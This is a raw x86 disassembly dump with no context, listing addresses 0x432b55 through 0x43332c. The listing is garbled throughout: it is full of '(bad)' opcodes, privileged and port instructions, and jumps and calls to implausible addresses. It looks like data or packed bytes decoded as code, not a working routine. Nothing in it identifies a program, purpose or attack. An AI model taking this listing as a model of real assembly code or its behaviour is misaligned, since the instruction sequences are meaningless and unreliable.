  432b55:	xor    ecx,DWORD PTR [eax]
  432b57:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432b5d:	add    ah,al
  432b5f:	xor    edi,edi
  432b61:	xor    DWORD PTR [ebx],0x66003302
  432b67:	mov    DWORD PTR [ebp-0xc],ecx
  432b6a:	pcmpgtw mm0,mm0
  432b6d:	add    dl,ah
  432b6f:	leave  
  432b70:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432b74:	push   eax
  432b75:	dec    ebp
  432b76:	mov    esi,DWORD PTR [ebx-0x75]
  432b79:	lea    ebp,[eax-0x7c00ff02]
  432b7f:	xor    eax,DWORD PTR [eax]
  432b81:	sysret 
  432b83:	dec    ebp
  432b84:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b8b:	push   WORD PTR [ecx+0x8]
  432b8f:	jne    0x432b52
  432b91:	ud0    ecx,DWORD PTR [ecx]
  432b94:	mov    eax,edx
  432b96:	lods   al,BYTE PTR ds:[esi]
  432b97:	add    BYTE PTR [eax],al
  432b99:	data16 (bad) 
  432b9b:	iret   
  432b9c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432ba3:	cli    
  432ba4:	inc    ebp
  432ba5:	cmp    al,0x8d
  432ba7:	add    BYTE PTR [esi+0x2d],ah
  432baa:	inc    ebp
  432bab:	pop    ebp
  432bac:	lea    ecx,[edi]
  432bae:	mov    dl,bh
  432bb0:	add    BYTE PTR [edi],cl
  432bb2:	mov    DWORD PTR [eax+eax*8],edi
  432bb5:	mov    ebx,0x3b87
  432bba:	add    BYTE PTR [ebx],ch
  432bbc:	inc    ebp
  432bbd:	data16 (bad) 
  432bbf:	clc    
  432bc0:	int3   
  432bc1:	cmp    eax,DWORD PTR [eax]
  432bc3:	je     0x432b4e
  432bc5:	push   0xffffffc8
  432bc7:	pop    edi
  432bc8:	xchg   DWORD PTR [ebp+0x0],eax
  432bcb:	data16 add BYTE PTR [ebp+0x45],cl
  432bcf:	lea    cx,[ebp+0x10]
  432bd3:	jb     0x432bd5
  432bd5:	jmp    0x432b60
  432bd7:	call   eax
  432bd9:	clc    
  432bda:	xchg   DWORD PTR [edi+0x1],edi
  432bdd:	mov    eax,DWORD PTR [eax]
  432bdf:	or     BYTE PTR [ebp-0x49],al
  432be2:	lea    eax,[eax+0x74003154]
  432be8:	push   edi
  432be9:	inc    edx
  432bea:	jge    0x432beb
  432bec:	mov    DWORD PTR [edi],ecx
  432bee:	fdiv   DWORD PTR [edi-0x6]
  432bf1:	inc    DWORD PTR [eax]
  432bf3:	xor    edx,DWORD PTR [eax+0x5f]
  432bf6:	xchg   DWORD PTR [ebx+0x1],ebx
  432bf9:	ret    0x0
  432bfc:	xor    BYTE PTR [ebp-0x51],cl
  432bff:	cmp    edi,0xf0ff89fe
  432c05:	data16 ror al,0x84
  432c09:	rol    BYTE PTR [eax],0x3b
  432c0c:	add    al,dh
  432c0e:	dec    eax
  432c0f:	xchg   esp,eax
  432c10:	push   ebx
  432c11:	jmp    0x432b9e
  432c13:	push   ebp
  432c14:	add    esp,ebp
  432c16:	add    ebp,esp
  432c18:	mov    edx,DWORD PTR [edi+0x24]
  432c1b:	clc    
  432c1c:	dec    esi
  432c1d:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432c23:	cmp    BYTE PTR [ebx],al
  432c25:	jne    0x432bb0
  432c27:	xor    esp,eax
  432c29:	jmp    0x462dac
  432c2e:	add    ebp,DWORD PTR [ecx+ecx*4]
  432c31:	jne    0x432c27
  432c33:	call   0xffcd298d
  432c38:	clc    
  432c39:	xchg   edi,eax
  432c3a:	sti    
  432c3b:	add    DWORD PTR [ebx],eax
  432c3d:	add    BYTE PTR [ebp+0x47],bl
  432c40:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432c46:	pop    ebp
  432c47:	mov    DWORD PTR [esi-0x48],esi
  432c4a:	jmp    0x432c93
  432c4c:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432c52:	(bad)  
  432c54:	cmp    al,0x0
  432c56:	cmp    eax,DWORD PTR [ebp+0x18]
  432c59:	lea    ebx,[ebp-0x56]
  432c5c:	jle    0x432c5e
  432c5e:	jae    0x432be9
  432c60:	mov    eax,esp
  432c62:	call   0xb900:0x8b005587
  432c69:	inc    ebp
  432c6a:	push   ebp
  432c6b:	lea    ecx,[ebp-0x27ff4f12]
  432c71:	mov    eax,edi
  432c73:	int3   
  432c74:	push   ebp
  432c75:	xchg   edi,eax
  432c77:	add    esp,ebp
  432c79:	add    BYTE PTR [eax],al
  432c7b:	inc    ebp
  432c7c:	add    BYTE PTR [ebp+0x8b3255],cl
  432c82:	cld    
  432c83:	mov    DWORD PTR [edx],edi
  432c85:	aam    0x75
  432c87:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c8d:	mov    DWORD PTR [ebx-0x50],edx
  432c90:	test   BYTE PTR [ebp-0x1],0xe8
  432c94:	mov    eax,DWORD PTR [eax]
  432c96:	hlt    
  432c97:	add    al,al
  432c99:	mov    eax,DWORD PTR ds:0x890045a8
  432c9f:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432ca5:	inc    DWORD PTR [eax*2+0xf75854d]
  432cac:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432cb2:	call   0x729989f3
  432cb7:	je     0x432d17
  432cb9:	js     0x432d1a
  432cbb:	lock ret 0x7e
  432cbf:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432cc5:	mov    edi,edi
  432cc7:	sbb    al,bl
  432cc9:	clc    
  432cca:	add    BYTE PTR [ebp-0x73],bh
  432ccd:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432cd3:	ror    BYTE PTR [eax],1
  432cd5:	dec    ebp
  432cd6:	xchg   ebp,eax
  432cd7:	mov    edi,edi
  432cd9:	in     al,0x8b
  432cdb:	jge    0x432c66
  432cdd:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ce3:	clc    
  432ce4:	pop    esi
  432ce5:	fist   DWORD PTR [ebp+0x5d398b5d]
  432ceb:	clc    
  432cec:	add    al,0x6e
  432cee:	mov    eax,DWORD PTR [ebx]
  432cf0:	mov    BYTE PTR [ebp+0x0],dl
  432cf3:	mov    edx,DWORD PTR [ebx-0x20]
  432cf6:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  432cfc:	add    eax,0x3b3b73
  432d01:	adc    al,0x89
  432d03:	pop    eax
  432d04:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432d08:	ret    0xf08
  432d0b:	cmp    al,0x2
  432d0d:	mov    edx,eax
  432d0f:	cld    
  432d10:	add    BYTE PTR [ebp+0x66],dl
  432d13:	add    eax,ebx
  432d15:	add    esp,eax
  432d17:	sub    eax,eax
  432d19:	or     BYTE PTR [ecx-0x77f474bb],cl
  432d1f:	add    BYTE PTR [eax],al
  432d21:	mov    DWORD PTR [ebx-0x24],ebx
  432d24:	push   edi
  432d25:	push   ebp
  432d26:	clc    
  432d27:	add    DWORD PTR [esi+0x1b0100],0x45
  432d2e:	out    0xff,eax
  432d30:	add    edx,DWORD PTR [eax]
  432d32:	jmp    0x432d1c
  432d34:	cmp    ch,0x46
  432d37:	(bad)  
  432d38:	jmp    0x40c8b58a
  432d3d:	je     0x432cc9
  432d3f:	mov    eax,DWORD PTR [eax-0x10c78104]
  432d45:	inc    ebp
  432d46:	add    BYTE PTR [ebx-0x770375],al
  432d4c:	add    ah,ch
  432d4e:	add    edx,esp
  432d50:	pop    edi
  432d51:	pop    ebp
  432d52:	push   ebp
  432d53:	inc    ebx
  432d54:	in     al,dx
  432d55:	pop    ebp
  432d56:	in     al,dx
  432d57:	cmp    edx,DWORD PTR [edi-0x8]
  432d5a:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  432d61:	add    al,0x47
  432d63:	push   ebp
  432d64:	mov    esp,ebp
  432d66:	in     al,0x45
  432d68:	dec    ebp
  432d69:	push   esi
  432d6a:	test   DWORD PTR [eax+0xfb010f],esi
  432d70:	add    BYTE PTR [eax+0xc018b],dh
  432d76:	leave  
  432d77:	inc    ebp
  432d78:	test   al,ch
  432d7a:	add    dh,bh
  432d7c:	add    bh,bh
  432d7e:	dec    ebp
  432d7f:	push   cs
  432d80:	mov    DWORD PTR [ecx],eax
  432d82:	hlt    
  432d83:	push   es
  432d84:	dec    ebp
  432d85:	leave  
  432d86:	mov    DWORD PTR [eax],ecx
  432d88:	clc    
  432d89:	cmovge eax,ecx
  432d8c:	mov    ecx,0x85c2f0
  432d92:	clc    
  432d93:	pop    DWORD PTR [ebp+0x1]
  432d96:	push   ebx
  432d97:	add    BYTE PTR [ebp-0x15],bh
  432d9a:	push   esi
  432d9b:	xor    eax,0x898a45
  432da0:	cld    
  432da1:	add    al,BYTE PTR [ebp+0x0]
  432da4:	xor    esp,DWORD PTR [esi-0x64]
  432da7:	add    DWORD PTR [esi+0x78308c1],edi
  432dad:	add    ah,BYTE PTR [ebp-0x49]
  432db0:	int    0xbb
  432db2:	mov    ecx,DWORD PTR [esi+0xc]
  432db5:	add    dh,al
  432db7:	cmp    ecx,ebx
  432db9:	jne    0x432d83
  432dbb:	xor    ecx,DWORD PTR [ebp+0x66]
  432dbe:	jmp    0xca2dc4
  432dc3:	add    DWORD PTR [ebp+0x0],eax
  432dc6:	mov    eax,ebx
  432dc8:	or     al,0x8b
  432dca:	(bad)  
  432dcb:	mov    ecx,esi
  432dcd:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  432dd4:	mov    eax,edi
  432dd6:	or     BYTE PTR [edx],cl
  432dd8:	shl    cl,cl
  432dda:	icebp  
  432ddb:	add    BYTE PTR [ebp+0x38],0x8b
  432ddf:	or     BYTE PTR [edx+eax*2],cl
  432de2:	(bad)  
  432de3:	or     cl,dh
  432de5:	stc    
  432de6:	shl    DWORD PTR [ebp-0x30],0xc6
  432dea:	xor    al,0x0
  432dec:	inc    ebp
  432ded:	xchg   BYTE PTR [ebx],al
  432def:	add    esp,edi
  432df1:	add    BYTE PTR [ebp-0x39],cl
  432df4:	mov    al,bl
  432df6:	test   DWORD PTR [ebx+0x1c348375],ecx
  432dfc:	sub    al,0xbf
  432dfe:	jmp    0x432d85
  432e00:	mov    edi,eax
  432e02:	lock jge 0x432df6
  432e05:	lea    esi,[edx-0x74bad5ff]
  432e0b:	mov    ebp,esp
  432e0d:	or     cl,dh
  432e0f:	leave  
  432e10:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  432e17:	dec    ebp
  432e18:	dec    ebp
  432e19:	test   DWORD PTR [ebx],eax
  432e1b:	paddb  mm6,mm0
  432e1e:	add    DWORD PTR [eax],eax
  432e20:	dec    ebp
  432e21:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  432e27:	mov    esi,DWORD PTR [edx]
  432e29:	or     al,0x2b
  432e2b:	dec    ebp
  432e2c:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  432e32:	mov    esp,edi
  432e34:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  432e3b:	mov    DWORD PTR [ebx],ebp
  432e3d:	call   0xc76b76d
  432e42:	mov    DWORD PTR [ebp+0x10],ecx
  432e45:	(bad)  
  432e46:	push   0x8b85ff10
  432e4b:	clc    
  432e4c:	or     al,0x54
  432e4e:	(bad)  
  432e4f:	push   ecx
  432e50:	retf   
  432e51:	mov    ebx,0xff4d8dc8
  432e56:	mov    DWORD PTR [ebp+0x8],eax
  432e59:	xor    eax,DWORD PTR [ebp-0x75]
  432e5c:	cmp    ebp,DWORD PTR [ebx]
  432e5e:	lsl    ebx,WORD PTR [edi-0x8]
  432e62:	call   DWORD PTR [ebx-0x741bff75]
  432e68:	(bad)  
  432e69:	or     al,0x5b
  432e6b:	dec    ebp
  432e6c:	or     BYTE PTR [ebx],dh
  432e6e:	inc    ebp
  432e6f:	xor    esi,DWORD PTR ds:0x708088d
  432e75:	in     eax,0x9b
  432e77:	add    BYTE PTR [edx],dh
  432e79:	inc    ebp
  432e7a:	pop    edi
  432e7b:	xor    eax,edx
  432e7d:	test   DWORD PTR [eax],0x81108b8b
  432e83:	dec    ebp
  432e84:	sub    al,0x33
  432e86:	add    BYTE PTR [ebx],dh
  432e88:	push   esi
  432e89:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  432e8f:	mov    edi,eax
  432e91:	or     BYTE PTR [ebp+0x45],al
  432e94:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  432e9a:	xor    ecx,ecx
  432e9c:	pushf  
  432e9d:	push   es
  432e9e:	mov    DWORD PTR [esi-0x4],0xf8178538
  432ea5:	dec    ebp
  432ea6:	inc    ebp
  432ea7:	cmp    BYTE PTR [ecx],0x54
  432eaa:	pushf  
  432eab:	gs (bad) 
  432ead:	shl    esp,1
  432eaf:	dec    ebp
  432eb0:	xchg   BYTE PTR [eax-0x3dbaab08],al
  432eb6:	shr    ecx,1
  432eb8:	xlat   BYTE PTR ds:[ebx]
  432eb9:	rol    bh,cl
  432ebb:	mov    edx,esp
  432ebd:	or     BYTE PTR [ebp+0x4588f84d],al
  432ec3:	mov    ecx,DWORD PTR [eax]
  432ec5:	or     BYTE PTR [eax],al
  432ec7:	push   ebp
  432ec8:	mov    edi,DWORD PTR [eax+0xfc728b]
  432ece:	dec    ebp
  432ecf:	enter  0xceba,0x8
  432ed3:	retf   0x1807
  432ed6:	ret    0x9b4d
  432ed9:	mov    esi,DWORD PTR [edx]
  432edb:	or     al,0x33
  432edd:	into   
  432ede:	add    edx,esi
  432ee0:	add    ecx,edx
  432ee2:	bswap  eax
  432ee4:	ror    esi,0x98
  432ee7:	dec    ebp
  432ee8:	add    cl,ch
  432eea:	mov    edi,edi
  432eec:	hlt    
  432eed:	inc    esi
  432eef:	inc    ebp
  432ef0:	ret    0x4533
  432ef3:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  432ef9:	or     BYTE PTR [ebx],dh
  432efb:	dec    ebp
  432efc:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  432f02:	jne    0xff8d2ec9
  432f08:	inc    ebp
  432f09:	inc    ebp
  432f0a:	mov    esi,DWORD PTR [ebx]
  432f0c:	clc    
  432f0d:	pop    esi
  432f0e:	ret    0xcaeb
  432f11:	mov    eax,esi
  432f13:	call   0x520483e6
  432f18:	dec    ebp
  432f19:	add    eax,0xf8728b
  432f1e:	adc    eax,0xce0ccac9
  432f23:	push   ebp
  432f24:	ret    0xc6ec
  432f27:	in     al,dx
  432f28:	call   0x33437c31
  432f2d:	push   edi
  432f2e:	add    edi,eax
  432f30:	xor    eax,eax
  432f32:	jmp    0x432f79
  432f34:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  432f3a:	add    eax,edi
  432f3c:	shr    eax,cl
  432f3e:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  432f44:	mov    esi,DWORD PTR [edx]
  432f46:	in     al,dx
  432f47:	pushf  
  432f48:	ret    0x84c7
  432f4b:	fcomp  DWORD PTR [ebx-0x7607cd7b]
  432f51:	inc    ebp
  432f52:	in     al,dx
  432f53:	xor    DWORD PTR [ebp-0x64],eax
  432f56:	mov    eax,edi
  432f58:	cld    
  432f59:	fmul   st(2),st
  432f5b:	sbb    dl,al
  432f5d:	jmp    0x9c3b:0x304d45c1
  432f64:	jbe    0x432f2d
  432f66:	mov    esp,eax
  432f68:	clc    
  432f69:	add    BYTE PTR [ebp+0x0],cl
  432f6c:	mov    ecx,ecx
  432f6e:	lea    eax,[ebp-0x5]
  432f71:	mov    edi,edi
  432f73:	call   0x51ce83bd
  432f78:	hlt    
  432f79:	xor    eax,edx
  432f7b:	mov    esi,0x9b7284
  432f80:	xor    cl,dl
  432f82:	mov    esi,eax
  432f84:	hlt    
  432f85:	into   
  432f86:	inc    ebp
  432f87:	scas   eax,DWORD PTR es:[edi]
  432f88:	mov    ebp,ecx
  432f8a:	cld    
  432f8b:	add    dl,cl
  432f8d:	add    dl,al
  432f8f:	inc    ebp
  432f90:	shr    DWORD PTR [ebx],0x4d
  432f93:	xor    edi,DWORD PTR [ebx]
  432f95:	mov    DWORD PTR [edi],ecx
  432f97:	clc    
  432f98:	dec    esi
  432f99:	inc    ebp
  432f9a:	dec    DWORD PTR [ebx-0x3d2b1775]
  432fa0:	ret    0xc6ca
  432fa3:	mov    BYTE PTR [ebp-0x32],0x53
  432fa7:	scas   eax,DWORD PTR es:[edi]
  432fa8:	inc    ebp
  432fa9:	jmp    0x432fdb
  432fab:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  432fb2:	pop    ebx
  432fb3:	xor    ecx,DWORD PTR [ebp+0x3]
  432fb6:	mov    eax,DWORD PTR [ebx]
  432fb8:	clc    
  432fb9:	test   edx,ecx
  432fbb:	mov    ecx,esi
  432fbd:	cld    
  432fbe:	call   0x8ab77508
  432fc3:	xor    ecx,DWORD PTR [eax+0x4533f303]
  432fc9:	add    ecx,DWORD PTR [ebx-0x4974072d]
  432fcf:	fdiv   QWORD PTR [ebx]
  432fd1:	retf   0xce89
  432fd4:	in     al,0xc1
  432fd6:	inc    ebp
  432fd7:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  432fdd:	into   
  432fde:	mov    dh,0xc1
  432fe1:	call   0x8c17756a
  432fe6:	(bad)  
  432fe7:	cld    
  432fe8:	mov    ecx,DWORD PTR [ebp-0x14]
  432feb:	xor    eax,ecx
  432fed:	lea    eax,[ebp+0x8]
  432ff0:	mov    esi,DWORD PTR [edx-0x4]
  432ff3:	add    dl,al
  432ff5:	inc    ebp
  432ff6:	mov    esp,0x32d89b8b
  432ffb:	dec    ebp
  432ffc:	mov    esi,DWORD PTR [ebx]
  432ffe:	cld    
  432fff:	xor    eax,edx
  433001:	sub    esp,DWORD PTR [ebp-0x75]
  433004:	int    0xec
  433006:	sub    ecx,eax
  433008:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  43300e:	mov    esi,esp
  433010:	call   0x34177d99
  433015:	inc    DWORD PTR [ebx]
  433017:	mov    edi,DWORD PTR [ebx]
  433019:	cld    
  43301a:	jne    0x433069
  43301c:	mov    esi,DWORD PTR [ebx]
  43301e:	aam    0x8d
  433020:	dec    ebp
  433021:	or     BYTE PTR [ebx],dh
  433023:	jb     0x433028
  433025:	add    BYTE PTR [edi+0x45],bl
  433028:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  43302f:	xor    ebp,esp
  433031:	xor    eax,edi
  433033:	sub    edi,esp
  433035:	mov    eax,DWORD PTR [ebp+0x32c8f8f4]
  43303b:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  433042:	inc    ebp
  433043:	xor    ecx,DWORD PTR [ecx+0x45891403]
  433049:	clc    
  43304a:	mov    eax,edi
  43304c:	nop
  43304d:	fadd   QWORD PTR [eax]
  43304f:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  433055:	jmp    0x432fe0
  433057:	mov    eax,DWORD PTR [ecx]
  433059:	fadd   DWORD PTR [eax]
  43305b:	inc    ebp
  43305c:	or     DWORD PTR [ebx],esi
  43305e:	dec    eax
  43305f:	add    edx,DWORD PTR [ebx-0x2d]
  433062:	dec    ebp
  433063:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  433069:	inc    ebp
  43306a:	push   esp
  43306b:	mov    dl,BYTE PTR [ecx-0xd]
  43306e:	xor    ecx,DWORD PTR [ebp-0x45]
  433071:	(bad)  
  433073:	rol    BYTE PTR [eax],0xc1
  433076:	ret    
  433077:	inc    ebp
  433078:	inc    ebp
  433079:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  43307f:	xor    eax,ebx
  433081:	add    eax,DWORD PTR [ebp+0x23]
  433084:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  43308a:	cmp    edi,0xc
  43308d:	dec    ebp
  43308e:	inc    ebp
  43308f:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  433095:	inc    ebp
  433096:	mov    esi,DWORD PTR [ebx]
  433098:	clc    
  433099:	lea    eax,[ebp+0x45725407]
  43309f:	add    BYTE PTR [ebp+eax*2-0x75],dh
  4330a3:	xor    edi,DWORD PTR [eax]
  4330a5:	mov    ecx,0xff8b8d4d
  4330aa:	push   esp
  4330ab:	enter  0x4df7,0x23
  4330af:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  4330b5:	mov    eax,DWORD PTR [ebx]
  4330b7:	loopne 0x4330a4
  4330b9:	ret    0xc68b
  4330bc:	push   esp
  4330bd:	enter  0x9745,0x8b
  4330c1:	inc    ebp
  4330c2:	cld    
  4330c3:	mov    eax,edi
  4330c5:	clc    
  4330c6:	ret    
  4330c7:	ret    0xc645
  4330ca:	mov    esi,DWORD PTR [ebx]
  4330cc:	cld    
  4330cd:	pop    esi
  4330ce:	mov    ebx,0x83458bc3
  4330d4:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  4330d8:	dec    ebp
  4330d9:	xor    DWORD PTR [ebx],esi
  4330db:	pushf  
  4330dc:	add    edi,DWORD PTR [edx-0x7767a77]
  4330e2:	fcom   DWORD PTR [ebp+0x45]
  4330e5:	mov    esi,DWORD PTR [ebx]
  4330e7:	adc    al,0x9c
  4330e9:	inc    ebp
  4330ea:	(bad)  
  4330eb:	mov    ebx,eax
  4330ed:	adc    al,0x85
  4330ef:	cmp    al,0x1
  4330f2:	inc    ebp
  4330f3:	add    BYTE PTR ds:0xe98b9c4d,bh
  4330f9:	mov    eax,DWORD PTR [ebx]
  4330fb:	nop
  4330fc:	add    BYTE PTR [eax],al
  4330fe:	inc    ebp
  4330ff:	mov    esi,DWORD PTR [ebx]
  433101:	add    eax,DWORD PTR [ebx]
  433103:	cmp    al,0x89
  433105:	mov    esp,esi
  433107:	clc    
  433108:	inc    ebp
  433109:	inc    ebp
  43310a:	add    edx,DWORD PTR [esi+0xc]
  43310d:	mov    edi,0x7ff0845
  433112:	in     al,dx
  433113:	(bad)  
  433114:	jne    0x4330b1
  433116:	mov    esi,DWORD PTR [edx]
  433118:	clc    
  433119:	add    ebp,DWORD PTR [esi]
  43311b:	mov    edi,edi
  43311d:	in     al,dx
  43311e:	mov    DWORD PTR [ebp-0x10],eax
  433121:	xor    eax,DWORD PTR [ebp+0x3]
  433124:	cmp    DWORD PTR [ecx+0x458bf49c],ecx
  43312a:	fmul   DWORD PTR [ebx-0x173caf39]
  433130:	lea    ecx,[ecx+0x45e8d4bc]
  433136:	clc    
  433137:	mov    edi,edi
  433139:	cmp    BYTE PTR [ebp+0x4d],al
  43313c:	test   DWORD PTR [eax+0x74],ecx
  43313f:	inc    ecx
  433140:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  433146:	ret    
  433147:	inc    eax
  433148:	dec    DWORD PTR [ebx+0x4945f8f0]
  43314e:	push   eax
  43314f:	dec    eax
  433150:	test   al,0xd0
  433152:	dec    eax
  433154:	mov    eax,DWORD PTR [ebp-0x14]
  433157:	mov    eax,DWORD PTR [ebp+0x38]
  43315a:	mov    eax,ecx
  43315c:	fadd   DWORD PTR [ebx]
  43315e:	dec    ebp
  43315f:	inc    eax
  433160:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  433166:	inc    ebp
  433167:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  43316d:	fadd   QWORD PTR [ebx]
  43316f:	inc    ebp
  433170:	or     al,0x33
  433172:	dec    ebp
  433173:	add    edi,DWORD PTR [ebx]
  433175:	mov    DWORD PTR [edx-0x28],esi
  433178:	mov    eax,DWORD PTR [ebp-0x10]
  43317b:	mov    eax,DWORD PTR [eax+0x10]
  43317e:	mov    eax,edi
  433180:	lock ret 
  433182:	inc    ecx
  433183:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433189:	fsubr  st,st(5)
  43318b:	test   DWORD PTR [eax],eax
  43318d:	clc    
  43318e:	push   0x45
  433190:	(bad)  
  433191:	cmp    al,0xec
  433193:	pushf  
  433194:	inc    ebp
  433195:	(bad)  
  433196:	push   eax
  433197:	fsub   DWORD PTR [eax-0x7b]
  43319a:	(bad)  
  43319b:	clc    
  43319c:	mov    eax,0xf8008584
  4331a1:	mov    eax,DWORD PTR [ebp-0x4]
  4331a4:	mov    edi,0x4585c3cc
  4331aa:	clc    
  4331ab:	mov    eax,DWORD PTR [ebp+0x14]
  4331ae:	xor    eax,DWORD PTR [ebp-0x64]
  4331b1:	mov    edi,eax
  4331b3:	in     al,dx
  4331b4:	les    esi,FWORD PTR [ebp-0x7b]
  4331b7:	mov    edi,eax
  4331b9:	or     al,0x4d
  4331bb:	dec    ebp
  4331bc:	mov    eax,ebp
  4331be:	in     al,0xf2
  4331c0:	dec    ebp
  4331c1:	dec    DWORD PTR [ecx+0x4dc7e045]
  4331c7:	fmul   DWORD PTR [ecx+0x4df8f085]
  4331cd:	inc    ebp
  4331ce:	mov    DWORD PTR [ebx],esi
  4331d0:	fadd   QWORD PTR [ebx]
  4331d2:	dec    ebp
  4331d3:	push   eax
  4331d4:	xor    eax,DWORD PTR [ebp+0x3]
  4331d7:	push   eax
  4331d8:	mov    DWORD PTR [eax+ebx*8],ebx
  4331db:	push   esi
  4331dd:	mov    eax,DWORD PTR [eax]
  4331df:	lock cmp eax,0xf84e85c0
  4331e5:	inc    ebp
  4331e6:	test   BYTE PTR [ebx],dh
  4331e8:	add    DWORD PTR [ebx],eax
  4331ea:	add    BYTE PTR [eax+0x4d],dl
  4331ed:	jne    0x433222
  4331ef:	lea    ecx,[ebx-0x7617fc44]
  4331f5:	div    ah
  4331f7:	inc    DWORD PTR [ebp+0x45]
  4331fa:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433200:	jb     0x43318d
  433202:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433209:	mov    ecx,DWORD PTR [ebp-0x10]
  43320c:	xor    ecx,DWORD PTR [ebp+0x3]
  43320f:	mov    edi,DWORD PTR [ebx]
  433211:	adc    BYTE PTR [ebp+0x41],dh
  433214:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43321a:	ret    
  43321b:	push   ss
  43321c:	push   0x45
  43321e:	lea    ecx,[ebx+0x4de80cb0]
  433224:	sti    
  433225:	add    edi,edi
  433227:	or     BYTE PTR [ebp+0x4d],al
  43322a:	mov    ebp,DWORD PTR [ebx]
  43322c:	xor    ebp,ecx
  43322e:	mov    al,BYTE PTR [edx]
  433230:	add    eax,0xc7200
  433235:	jne    0x433284
  433237:	lea    esi,[ebx]
  433239:	mov    al,0xf
  43323b:	call   0xf2900
  433240:	shl    DWORD PTR [ecx],0x84
  433243:	pushf  
  433244:	add    DWORD PTR [ecx+0x4545d000],ecx
  43324a:	mov    esi,DWORD PTR [edx]
  43324c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433253:	test   DWORD PTR [eax],eax
  433255:	clc    
  433256:	dec    ebp
  433257:	inc    ebp
  433258:	xor    edi,DWORD PTR [edi+ecx*1]
  43325b:	pushf  
  43325c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433263:	lea    eax,[ecx]
  433265:	int3   
  433266:	add    BYTE PTR [ebp+0x45],cl
  433269:	lea    ecx,[ebx-0x75b2cc38]
  43326f:	lea    eax,ds:0x4d72c4
  433275:	mov    ecx,DWORD PTR [ebp-0x4]
  433278:	xor    ecx,edi
  43327a:	bswap  ebx
  43327c:	ror    BYTE PTR [ebp-0x35],0xe9
  433280:	rol    DWORD PTR [ecx],0x84
  433283:	add    BYTE PTR [ecx],al
  433285:	xor    eax,DWORD PTR [eax]
  433287:	pushf  
  433288:	inc    ebp
  433289:	jnp    0x8a43668c
  43328f:	mov    eax,DWORD PTR ds:0xcf72e8
  433295:	lock dec ebp
  433297:	retf   
  433298:	xor    ecx,DWORD PTR [ebp+0xf]
  43329b:	mov    eax,eax
  43329d:	fmul   st,st(3)
  43329f:	test   ecx,0x19b8484
  4332a5:	xor    al,BYTE PTR [eax]
  4332a7:	mov    DWORD PTR [ebp-0x28],eax
  4332aa:	mov    eax,DWORD PTR [ebp+0x33]
  4332ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4332b3:	ret    
  4332b4:	add    al,cl
  4332b6:	dec    ebp
  4332b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4332bd:	add    ecx,DWORD PTR ds:0xc7250
  4332c3:	inc    ebp
  4332c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4332c8:	mov    edi,edi
  4332ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4332d0:	jb     0x433299
  4332d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4332d9:	mov    esi,DWORD PTR [ebx]
  4332db:	cld    
  4332dc:	mov    cl,bh
  4332de:	or     eax,0x372b6
  4332e3:	cmp    ecx,eax
  4332e5:	jne    0x433362
  4332eb:	mov    eax,DWORD PTR [ebp-0x20]
  4332ee:	mov    eax,DWORD PTR [eax]
  4332f0:	xor    eax,edi
  4332f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4332f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4332fc:	mov    ecx,edi
  4332fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433304:	jb     0x433315
  433306:	add    BYTE PTR [edi-0x3f],dl
  433309:	add    BYTE PTR [ebp-0x75],cl
  43330c:	mov    esi,eax
  43330e:	xor    eax,DWORD PTR [eax]
  433310:	mov    al,bh
  433312:	or     eax,0x4b7284
  433317:	xor    al,cl
  433319:	mov    ecx,DWORD PTR [ebp-0x4]
  43331c:	mov    ecx,edi
  43331e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433324:	jb     0x433335
  433326:	add    BYTE PTR [edi],dh
  433328:	enter  0x8500,0x8b
  43332c:	add    ah,bl
